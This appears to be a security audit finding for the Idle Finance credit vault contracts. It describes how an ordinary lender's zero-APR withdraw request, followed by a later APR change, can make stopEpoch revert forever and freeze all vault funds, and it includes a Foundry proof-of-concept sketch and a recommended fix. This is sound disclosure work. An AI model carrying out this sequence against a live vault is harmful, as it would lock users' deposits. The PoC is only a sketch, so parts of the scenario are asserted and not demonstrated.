### Title
APR0 withdraw receipt permanently bricks `stopEpoch` once APR becomes non-zero, freezing all vault funds - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
Analogous to the Cosmos `x/group` EndBlocker halt, an unprivileged lender can put the epoch state machine into a state where the only way to advance it (`stopEpoch` / `stopEpochWithDuration`) unconditionally reverts. `prepareStopEpochWithApr0` reverts with `NotAllowed` whenever `apr0TotalPrincipal != 0` while `unscaledApr != 0`. A lender creates `apr0TotalPrincipal > 0` via `requestWithdraw` during a zero-APR period; if a subsequent epoch runs with `unscaledApr != 0`, every `stopEpoch` call reverts before reaching the borrower pull or the default fallback, so the epoch can never end and no default/recovery path can be triggered. All user principal is permanently frozen.

### Finding Description
- `requestWithdraw` records APR0 requests in `apr0TotalPrincipal` when `unscaledApr == 0` (`IdleCreditVault.sol:285-286`, `_requestWithdrawApr0` at `:567-577`).
- `claimWithdrawRequest` → `_claimFundedWithdrawRequest` deletes `apr0Users[_user]` but never decrements `apr0TotalPrincipal` (`:344-348`); the only place that resets it is `prepareStopEpochWithApr0` itself (`:540`), or `_clearWithdrawClaimForEpoch` during default finalization (`:827`), which itself can only run after a default — which requires a successful `stopEpoch` first.
- In `_stopEpoch`, `prepareStopEpochWithApr0` is called at `IdleCDOEpochVariant.sol:362` — before the `try this.getFundsFromBorrower(...)` / `catch { _handleBorrowerDefault }` block (`:408`, `:504`). The revert at `IdleCreditVault.sol:506-508` therefore cannot be converted into a default; it propagates and leaves `isEpochRunning == true`.
- Reentrancy into a non-zero APR epoch is legitimate: the APR for the next epoch is set by the honest manager via `stopEpoch(_newApr, ...)`/`_setScaledApr`, or by `setAprs`. A lender's pending APR0 receipt from a prior zero-APR epoch (or a receipt made in the buffer window) then poisons every subsequent stop.

### Impact Explanation
Permanent freezing of all user funds: the epoch can never be stopped, `startEpoch`/`finalizeDefault` are unreachable (default can only be entered through `_stopEpoch`'s catch path or `getInstantWithdrawFunds`, both of which are either blocked or revert-free only in unrelated states), and the borrower is never obliged to repay. Tranche holders keep receipt tokens that can never be claimed. Loss = entire vault NAV.

### Likelihood Explanation
Requires (a) an epoch/buffer with `unscaledApr == 0` where a lender submits `requestWithdraw`, and (b) a later epoch configured with non-zero APR while `apr0TotalPrincipal` is still non-zero — a plausible config change by honest management. The attacker only needs to be a KYC-passing lender making a normal withdrawal request; no privileged cooperation is needed.

### Recommendation
Do not revert in `prepareStopEpochWithApr0` when `unscaledApr != 0`. Either settle the pending APR0 principal at zero rate (write `apr0RateByEpoch[epochNumber] = 0`, clear `apr0TotalPrincipal`, keep `pendingWithdraws` funding the principal) or migrate the APR0 bucket to the normal `withdrawsRequests` path. Additionally, decrement `apr0TotalPrincipal` in `_claimFundedWithdrawRequest`/`_settleApr0` so stale buckets cannot outlive the receipt.

### Proof of Concept
```solidity
// Foundry fork PoC sketch (setup mirrors test/foundry/IdleCreditVault.t.sol APR0 tests)
// 1. manager sets APRs to 0 for the pool
vm.prank(manager);
IdleCreditVault(address(strategy)).setAprs(0, 0);

// 2. attacker (ordinary KYC'd lender) deposits and requests withdraw -> apr0TotalPrincipal > 0
deal(underlying, attacker, 10_000e6);
vm.startPrank(attacker);
IERC20(underlying).approve(address(idleCDO), type(uint256).max);
idleCDO.depositAA(10_000e6);
cdoEpoch.requestWithdraw(0, address(AAtranche));
vm.stopPrank();
assertGt(strategy.apr0TotalPrincipal(), 0);

// 3. honest manager starts an epoch and later sets a non-zero APR
//    (normal operation: stopEpoch(prevApr) then startEpoch, then setAprs(newApr))
_startEpochAndCheckPrices(0);
vm.warp(cdoEpoch.epochEndDate() + 1);
deal(underlying, borrower, cdoEpoch.expectedEpochInterest());
vm.prank(manager);
cdoEpoch.stopEpoch(5e18, 0);   // sets non-zero apr for next epoch; apr0 receipt still open
// attacker request remains unsettled -> apr0TotalPrincipal still > 0 (receipt cannot be claimed:
// claim requires epochNumber > lastWithdrawRequest AND a successful stop)

// 4. every subsequent stopEpoch reverts -> epoch 1 can never end
_startEpochAndCheckPrices(1);
vm.warp(cdoEpoch.epochEndDate() + 1);
deal(underlying, borrower, type(uint128).max);
vm.prank(manager);
vm.expectRevert(NotAllowed.selector);   // IdleCreditVault.sol:506-508
cdoEpoch.stopEpoch(0, 0);

// 5. no recovery path: default only reachable inside _stopEpoch's catch, which is never reached
assertTrue(cdoEpoch.isEpochRunning());
assertFalse(cdoEpoch.defaulted());
// all LPs' funds permanently frozen
```

Note: the revert at `IdleCreditVault.sol:506-508` appears intentional (a test asserts it at `test/foundry/IdleCreditVault.t.sol:3331-3337`), so this may be considered acknowledged hardening; however the guard's side effect — an unrecoverable halt reachable via an ordinary lender request plus a routine APR change — is itself the vulnerability, matching the advisory's "erroring end blocker halts the chain" class. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L285-286)
```text
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L502-508)
```text
    if (_principal == 0) {
      return (_expInterest, _adjPendingWithdrawFees);
    }
    // APR0 principal is only valid while APR is 0 for that request lifecycle.
    if (unscaledApr != 0) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L539-541)
```text
    // Close current APR0 bucket so it cannot accrue again on later stopEpoch calls.
    apr0TotalPrincipal = 0;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L567-577)
```text
  function _requestWithdrawApr0(uint256 _amount, address _user) internal {
    // Settle any previous APR0 request first, then start/update current epoch bucket.
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    if (_apr0User.principal == 0) {
      _apr0User.principalEpoch = epochNumber;
    }
    _apr0User.principal += _amount;
    // Epoch-level APR0 principal used only to compute stopEpoch APR0 pro-rata interest.
    apr0TotalPrincipal += _amount;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L361-365)
```text
    // Strategy finalizes APR0 bucket state and returns adjusted stopEpoch values.
    (_expectedInterest, _pendingWithdrawFees) = _strategy.prepareStopEpochWithApr0(_interest);
    // Pending withdraws may be increased during APR0 settlement, so read after prepareStopEpochWithApr0.
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();

```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```
